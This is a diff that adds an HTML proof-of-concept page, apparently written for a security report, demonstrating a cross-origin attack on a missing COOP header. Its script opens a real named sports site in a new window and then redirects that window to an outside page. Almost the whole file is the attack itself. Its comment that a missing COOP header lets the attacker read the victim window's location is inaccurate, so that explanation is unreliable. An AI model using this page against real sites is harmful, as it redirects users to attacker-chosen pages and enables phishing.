@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Malicious Attacker Page</title>
+</head>
+<body>
+  <h1>Welcome to Test Page</h1>
+  <p>This page demonstrates a cross-origin attack due to missing COOP header.</p>
+
+  <script>
+    // Open the victim's website in a new window
+    const victimWindow = window.open('https://fans.sports.qq.com/');
+
+    // Wait for the victim's page to load
+    setTimeout(() => {
+      try {
+        // Attempt to access the victim's window object
+        if (victimWindow && !victimWindow.closed) {
+          // If the victim's site does not have COOP, the attacker can access its window object
+          console.log('Victim window location:', victimWindow.location.href);
+
+          // Example: Redirect the victim's window to a malicious page
+          victimWindow.location.href = 'https://dolphindiv.github.io';
+        } else {
+          console.log('Victim window is closed or inaccessible.');
+        }
+      } catch (e) {
+        console.error('Failed to access victim window:', e.message);
+      }
+    }, 3000); // Wait 3 seconds for the victim's page to load
+  </script>
+</body>
+</html>
